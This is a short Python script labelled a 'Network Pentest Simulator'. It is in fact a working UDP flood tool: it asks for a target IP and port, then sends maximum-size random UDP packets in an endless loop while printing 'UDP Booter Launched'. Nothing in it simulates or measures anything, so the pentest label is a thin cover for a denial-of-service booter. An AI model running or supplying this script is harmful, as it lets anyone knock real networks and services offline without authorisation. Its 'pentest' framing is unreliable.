import random
import socket

def pen(ip, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    dest = (ip, port)
    packet = random._urandom(65507)

    while True:
        s.sendto(packet, dest)
        print("Network Pentest!")

print("Network Pentest Simulator")
addr = str(input("Input IP : "))
port = int(input("Input PORT : "))
print("UDP Booter Launched")
print("CTRL + C to Stop")
pen(addr, port)